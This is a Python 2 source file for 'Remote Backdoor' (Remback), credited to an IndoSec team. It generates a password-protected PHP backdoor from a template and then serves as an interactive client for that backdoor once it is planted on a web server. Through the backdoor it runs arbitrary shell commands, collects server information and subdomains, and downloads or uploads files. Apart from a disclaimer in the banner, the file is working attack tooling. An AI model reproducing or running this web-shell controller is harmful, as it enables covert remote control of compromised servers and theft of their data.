# -*- coding: utf-8 -*-
from requests import post
from time import sleep
import os
import re
import sys
from sys import platform
reload(sys)
sys.setdefaultencoding('utf8')


def cls():
    os.system('cls' if os.name=='nt' else 'clear')
     
def banner():
    print("""
         \033[91m`:+syhhys+:`          \033[92m ______ _______ _______  _____  _______ _______
       \033[91m-yNMMMMMMMMMMMh:        \033[92m|_____/ |______ |  |  | |     |    |    |______
      \033[91m/MMMMMMMMMMMMMMMM+       \033[92m|    \_ |______ |  |  | |_____|    |    |______
      \033[91mNhMMMMMMMMMMMMMMyN`      \033[97m                                        \t\tBeta V.0.1
      \033[91mm+NMMMMMMMMMMMMM/N       \033[92m______  _______ _______ _     _ ______   _____   _____   ______
      \033[91m:omy+/:+MM+:/+yN+/       \033[92m|_____] |_____| |       |____/  |     \ |     | |     | |_____/
  \033[91m:-   -M-  `/NN/`  :M.   --   \033[92m|_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_\033[0m
 \033[91m.mN.  :NNysmM++NmssNN-  .Nm.  \033[92m---------------------------------------------------------------
\033[91m.yyhyys///+yMd+odMh+///syhhyy. \033[97mAuthor : Rizsyad AR ft Fauzan W                     \033[0m
 \033[91m`  `.-+s-o/syyyys/s:s+:.`  `  \033[97mTeam   : { IndoSec }                                \033[0m
          \033[91ms-      :y           \033[97mWe not responsible for damage caused by Remback.    \033[0m
  \033[91m`/:-/ohy+mhyssyhm+sho/-:/`   \033[97mAttacking targets without mutual consent is illegal!\033[0m
   \033[91m+mNy+-` ./osso/. `-+yNm+   
    \033[91ms/                  +s\033[0m 
    """)

def help():
    print("""
[\033[91m+\033[97m] Command :
└[\033[92m•\033[97m] info\t\t: information gathering
└[\033[92m•\033[97m] download <file>\t: download file
└[\033[92m•\033[97m] upload <full/path/of/file>\t: download file
└[\033[92m•\033[97m] cd <dir>\t\t: change directory""")

def fiturcd(cmd, getdir):
    getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
    newdir1 = ""

    if getcmd:
        if getcmd.group(1) == "..":
            for i in getdir.split('/')[:-1]:
                newdir1 += i + "/"

            result = newdir1

            return result

        else:
            for i in getdir.split('/'):
                newdir1 += i + "/" 
            
            result = newdir1 + getcmd.group(1)

            return result
    else:
        return False
        
def fiturdownload(cmd, getdir):
    getfile = re.match(r'download (.*)', cmd, re.M|re.I)
    
    if getfile:
        result = getdir + "/" + getfile.group(1)
        return result
    else:
        return False

def fiturupload(cmd, getdir):
    getfile = re.match(r'upload (.*)', cmd, re.M|re.I)
    
    if getfile:
        result = getfile.group(1)
        return result
    else:
        return False

    
def connect():
    url = raw_input("[\033[93m?\033[97m] Input Backdoor Location\t: ")
    password = raw_input("[\033[93m?\033[97m] Input Backdoor Password\t: ")

    try:
        check = post(url, data={"password":password}).text.replace('\n','')
    except KeyboardInterrupt:
        print("\n\n[\033[93m!\033[97m] CTRL+C Detected.....")
        raise SystemExit
    except:
        print("[\033[91m-\033[97m] \033[91mError, Check your URL!")
        exit(0)

    if check == "true":
    
        getdir = post(url, data={"password":password,"cmd":"pwd"}).text.replace('\n','')

        sleep(2)
        print("[\033[93m!\033[97m] Backdoor Is Live.. Waiting to Connect BackDoor")
        sleep(2)
        print("[\033[92m✔\033[97m] Backdoor Is Connected..\n")


        command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
        result = ""
        
        while True:
                cmd = raw_input(command).rstrip()
                #upload_file = re.match

                if cmd == "exit":
                    break
                elif cmd == "clear":
                    cls()
                    banner()    
                elif cmd == "info":
                    result = post(url, data={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                    print(result)
                elif cmd == "subdo":
                    result = post(url, data={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
                    print("\n" + result)
                elif cmd == "command":
                    help()


                if(fiturcd(cmd, getdir) != False):
                    output = fiturcd(cmd, getdir)
                    getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
                    command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
                elif(fiturdownload(cmd, getdir) != False):
                    getname = re.match(r'download (.*)', cmd, re.M|re.I)
                    output = fiturdownload(cmd, getdir)
                    savein = raw_input("[?] Save File in: ")
                    data = {
                        "password":password,
                        "dir":getdir,
                        "cmd":"",
                        "aksi":"download",
                        "file":output
                    }
                    download = post(url, data=data)  
                    if download.text != "False":
                        open(savein + "/" + getname.group(1), 'wb').write(download.content)
                        result = "[\033[92m✔\033[97m] Success, Download File..\n"              
                    else:
                        result = "[\033[91m-\033[97m] \033[91mError, Download File, Please check name file target!"
                    
                        

                elif(fiturupload(cmd, getdir) != False):
                    getname = re.match(r'upload (.*)', cmd, re.M|re.I)
                    filename = getname.group(1).split('/')[-1]
                    try:
                        files = open(getname.group(1),"rb")
                        data = {
                            "password":password,
                            "dir":getdir,
                            "cmd":"",
                            "aksi":"upload",
                            "name":filename
                        }
                        upload = post(url, data=data, files={"file":files}).text

                        if(upload != "error"):
                            result = "[\033[92m✔\033[97m] Success, Upload File..\n" 
                        else:
                            result = "[\033[91m-\033[97m] \033[91mError, Upload File!"
                        
                        
                    except:
                        print("[\033[91m-\033[97m] \033[91mError, Can't open file!")
                    
                else:
                    ###########cmd = ""
                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text

                print("\033[92m"+result + "\033[0m\n")
    
    else:
        print("[-] Password is Incorrect")
        exit(0)


def generate():
    backdoor_name   = raw_input("\n[\033[93m?\033[97m] Backdoor Name : ")
    password        = raw_input("[\033[93m?\033[97m] Password      : ")
    opensample      = open('sample/backdoor.txt', 'r')
    replacePassword = opensample.read().replace('12345', password)
    opensample.close()
    openbackdoor    = open(backdoor_name + '.php', 'w')
    openbackdoor.write(replacePassword)
    openbackdoor.close()
    print("""\n[\033[92m✔] \033[97mGenerating backdoor successfully\n└[\033[91m•\033[97m] Backdoor Name\t: """ + backdoor_name + """\n└[\033[91m•\033[97m] Backdoor Password\t: """ + password +"""""")

try:
    cls()
    banner()
    if platform == "win32":
        print("[\033[93m!\033[97m] Sorry, this tool does not work on Windows operating systems")
    else:
        print("""[\033[91m+\033[97m] Options :\n└[\033[92m•\033[97m] \033[91m1. \033[97mGenerate Backdoor\n└[\033[92m•\033[97m] \033[91m2. \033[97mRemote Backdoor\n└[\033[92m•\033[97m] \033[91m3. \033[97mBypass Shell Exec (Coming Soon)""")
        action = raw_input("\n\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92mChoose the options\033[91m]\n\033[96m└\033[93m#\033[97m ")
        if action == "1":
            cls()
            banner()
            generate()
        elif action == "2":
            cls()
            banner()
            connect()
        elif action == "3":
            print("[\033[93m!\033[97m] Coming soon")
        else:
            print("[!] Incorrect options")
except KeyboardInterrupt:
    print("\n\n[\033[93m!\033[97m] CTRL+C Detected.....")
    raise SystemExit

